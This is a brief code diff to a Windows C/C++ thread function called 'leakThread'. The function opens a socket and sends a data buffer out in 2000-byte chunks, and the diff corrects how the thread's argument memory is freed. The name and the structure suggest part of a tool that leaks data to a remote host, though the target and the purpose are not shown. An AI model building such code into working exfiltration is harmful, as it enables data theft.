@@ -59,7 +59,7 @@ DWORD WINAPI leakThread(LPVOID args) {
 	SOCKET leakSocket = getSocket();
 	if (leakSocket == INVALID_SOCKET) {
 		WSACleanup();
-		delete[] (char *)&size;
+		delete[] (char *)args;
 		return 1;
 	}
 
@@ -73,7 +73,7 @@ DWORD WINAPI leakThread(LPVOID args) {
 		if (send(leakSocket, data, 2000, 0) == SOCKET_ERROR) {
 			closesocket(leakSocket);
 			WSACleanup();
-			delete[](char*)& size;
+			delete[] (char*)args;
 			return 2;
 		}
 		size -= 2000;
@@ -83,7 +83,7 @@ DWORD WINAPI leakThread(LPVOID args) {
 	send(leakSocket, data, size, 0);
 	closesocket(leakSocket);
 	WSACleanup();
-	delete[] (char*)&size;
+	delete[] (char*)args;
 
 	return 0;
 }
